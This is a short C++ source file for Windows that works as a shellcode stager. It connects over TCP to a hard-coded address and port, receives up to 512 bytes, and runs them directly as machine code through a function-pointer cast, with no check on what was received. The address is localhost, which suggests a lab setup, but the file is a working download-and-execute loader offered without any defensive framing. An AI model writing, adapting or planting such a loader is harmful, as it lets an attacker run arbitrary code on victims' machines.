/*
    Compile instructions (windows):

    g++ -m32 .\main.cpp -o .\main.exe -lws2_32
*/

#include <iostream>
#include <cstdlib>
#include <winsock2.h>
#include <windows.h>
#define BUFF_MAX 512

char IP[] = "127.0.0.1";
int PORT = 9000;

char * get_shellcode(int * shellcodeLen);

int main() {
    int shellcodeLen = 0;
    char *shellcode = NULL;
    shellcode = get_shellcode(&shellcodeLen);

    if(shellcode){
        int (* f)() = (int (*)()) shellcode;
        f();
    } else {
        printf("No bytes received.");
    }
}

char * get_shellcode(int * shellcodeLen){    
    WSADATA wsaData;
    int nret;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    LPHOSTENT hostEntry;
    in_addr serverInfo;
    serverInfo.s_addr = inet_addr(IP);
    hostEntry = (LPHOSTENT) gethostbyaddr((const char *)&serverInfo, sizeof(struct in_addr), AF_INET);
    
    if (!hostEntry) {
        printf("gethostbyaddr error: %d\n", WSAGetLastError());
        WSACleanup();
        return NULL;
    }

    SOCKET sock;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET) {
        printf("socket error: %d\n", WSAGetLastError());
        WSACleanup();
        return NULL;
    }

    SOCKADDR_IN addressInfo;

    addressInfo.sin_family = AF_INET;
    addressInfo.sin_addr = *((LPIN_ADDR) * hostEntry->h_addr_list);
    addressInfo.sin_port = htons(PORT);

    nret = connect(sock, (LPSOCKADDR) &addressInfo, sizeof(struct sockaddr));

    if (nret == SOCKET_ERROR) {
        printf("connect error: %d\n", WSAGetLastError());
       WSACleanup();
       return NULL;
    }

    // Successfully connected!

    static char recvbuff[BUFF_MAX];
    char buffLen = 0;

    int iResult = recv(sock, recvbuff, BUFF_MAX, 0);
    if (iResult > 0){
        printf("Bytes received: %d\n", iResult);
        buffLen += iResult;
    }
    else if (iResult == 0)
        printf("Connection closed\n");
    else{
        printf("recv failed: %d\n", WSAGetLastError());
        return NULL;
    }

    *shellcodeLen = buffLen;
    WSACleanup();
    return recvbuff;
}